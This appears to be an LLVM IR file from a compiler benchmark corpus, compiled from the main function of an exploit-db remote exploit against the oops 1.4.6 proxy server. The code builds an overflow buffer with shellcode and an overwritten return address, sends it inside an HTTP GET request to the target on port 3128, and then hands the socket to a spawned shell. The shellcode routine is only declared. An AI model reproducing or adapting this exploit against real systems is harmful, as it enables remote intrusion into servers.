; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_228.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/bsd/remote/extr_228.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@OFFSET2 = common dso_local global i64 0, align 8
@RETOFF = common dso_local global i64 0, align 8
@BUFADDR = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [13 x i8] c"GET http://p\00", align 1
@.str.1 = private unnamed_addr constant [14 x i8] c" HTTP/1.0\0D\0A\0D\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [44 x i8] c"oops-1.4.6 remote xpl0it for 4.x by diman.\0A\00", align 1
@.str.3 = private unnamed_addr constant [35 x i8] c"use for educational purpose only.\0A\00", align 1
@.str.4 = private unnamed_addr constant [44 x i8] c"usage: ./oopz target_host [port, def=3128]\0A\00", align 1
@.str.5 = private unnamed_addr constant [18 x i8] c"can't resolve %s\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@.str.6 = private unnamed_addr constant [21 x i8] c"can't connect %s:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [32 x i8] c"Connected. Sending surprise...\0A\00", align 1
@FIL = common dso_local global i8 0, align 1
@SZ = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [8192 x i8], align 16
  %7 = alloca [8192 x i8], align 16
  %8 = alloca i8*, align 8
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 4
  %13 = alloca i16, align 2
  %14 = alloca i32*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i16 3128, i16* %13, align 2
  %15 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %16 = call i32 @memset(i8* %15, i8 signext -65, i32 8192)
  %17 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %18 = call i32 @shellcode(i8* %17)
  %19 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %20 = call i64 @strlen(i8* %19)
  %21 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 %20
  store i8 -65, i8* %21, align 1
  %22 = load i64, i64* @OFFSET2, align 8
  %23 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 %22
  store i8* %23, i8** %8, align 8
  %24 = load i8*, i8** %8, align 8
  %25 = call i32 @shellcode(i8* %24)
  %26 = load i8*, i8** %8, align 8
  %27 = call i64 @strlen(i8* %26)
  %28 = load i8*, i8** %8, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 %27
  store i8* %29, i8** %8, align 8
  %30 = load i8*, i8** %8, align 8
  store i8 -65, i8* %30, align 1
  %31 = load i64, i64* @RETOFF, align 8
  %32 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 %31
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %14, align 8
  %34 = load i32, i32* @BUFADDR, align 4
  %35 = load i32*, i32** %14, align 8
  store i32 %34, i32* %35, align 4
  %36 = load i64, i64* @RETOFF, align 8
  %37 = add i64 %36, 4
  %38 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 %37
  store i8 0, i8* %38, align 1
  %39 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %40 = call i32 @strcpy(i8* %39, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str, i64 0, i64 0))
  %41 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %42 = getelementptr inbounds [8192 x i8], [8192 x i8]* %6, i64 0, i64 0
  %43 = call i32 @strcat(i8* %41, i8* %42)
  %44 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %45 = call i32 @strcat(i8* %44, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.1, i64 0, i64 0))
  %46 = load i32, i32* @stderr, align 4
  %47 = call i32 (i32, i8*, ...) @fprintf(i32 %46, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.2, i64 0, i64 0))
  %48 = load i32, i32* @stderr, align 4
  %49 = call i32 (i32, i8*, ...) @fprintf(i32 %48, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.3, i64 0, i64 0))
  %50 = load i32, i32* %4, align 4
  %51 = icmp slt i32 %50, 2
  br i1 %51, label %52, label %56

52:                                               ; preds = %2
  %53 = load i32, i32* @stderr, align 4
  %54 = call i32 (i32, i8*, ...) @fprintf(i32 %53, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.4, i64 0, i64 0))
  %55 = call i32 @exit(i32 0) #3
  unreachable

56:                                               ; preds = %2
  %57 = load i8**, i8*** %5, align 8
  %58 = getelementptr inbounds i8*, i8** %57, i64 1
  %59 = load i8*, i8** %58, align 8
  store i8* %59, i8** %8, align 8
  %60 = load i32, i32* %4, align 4
  %61 = icmp sgt i32 %60, 2
  br i1 %61, label %62, label %67

62:                                               ; preds = %56
  %63 = load i8**, i8*** %5, align 8
  %64 = getelementptr inbounds i8*, i8** %63, i64 2
  %65 = load i8*, i8** %64, align 8
  %66 = call signext i16 @atoi(i8* %65)
  store i16 %66, i16* %13, align 2
  br label %67

67:                                               ; preds = %62, %56
  %68 = load i8*, i8** %8, align 8
  %69 = call i32 @res(i8* %68, %struct.sockaddr_in* %12)
  %70 = icmp ne i32 %69, 0
  br i1 %70, label %76, label %71

71:                                               ; preds = %67
  %72 = load i32, i32* @stderr, align 4
  %73 = load i8*, i8** %8, align 8
  %74 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.5, i64 0, i64 0), i8* %73)
  %75 = call i32 @exit(i32 0) #3
  unreachable

76:                                               ; preds = %67
  %77 = load i32, i32* @AF_INET, align 4
  %78 = load i32, i32* @SOCK_STREAM, align 4
  %79 = load i32, i32* @IPPROTO_TCP, align 4
  %80 = call i32 @socket(i32 %77, i32 %78, i32 %79)
  store i32 %80, i32* %11, align 4
  %81 = load i16, i16* %13, align 2
  %82 = call i32 @htons(i16 signext %81)
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  store i32 %82, i32* %83, align 4
  %84 = load i32, i32* %11, align 4
  %85 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %86 = call i32 @connect(i32 %84, %struct.sockaddr* %85, i32 4)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %95

88:                                               ; preds = %76
  %89 = load i32, i32* @stderr, align 4
  %90 = load i8*, i8** %8, align 8
  %91 = load i16, i16* %13, align 2
  %92 = sext i16 %91 to i32
  %93 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* %90, i32 %92)
  %94 = call i32 @exit(i32 0) #3
  unreachable

95:                                               ; preds = %76
  %96 = load i32, i32* @stderr, align 4
  %97 = call i32 (i32, i8*, ...) @fprintf(i32 %96, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.7, i64 0, i64 0))
  %98 = load i32, i32* %11, align 4
  %99 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %100 = getelementptr inbounds [8192 x i8], [8192 x i8]* %7, i64 0, i64 0
  %101 = call i64 @strlen(i8* %100)
  %102 = call i32 @send(i32 %98, i8* %99, i64 %101, i32 0)
  %103 = load i32, i32* %11, align 4
  %104 = call i32 @spawned_shell(i32 %103)
  %105 = load i32, i32* %3, align 4
  ret i32 %105
}

declare dso_local i32 @memset(i8*, i8 signext, i32) #1

declare dso_local i32 @shellcode(i8*) #1

declare dso_local i64 @strlen(i8*) #1

declare dso_local i32 @strcpy(i8*, i8*) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local signext i16 @atoi(i8*) #1

declare dso_local i32 @res(i8*, %struct.sockaddr_in*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i16 signext) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i8*, i64, i32) #1

declare dso_local i32 @spawned_shell(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
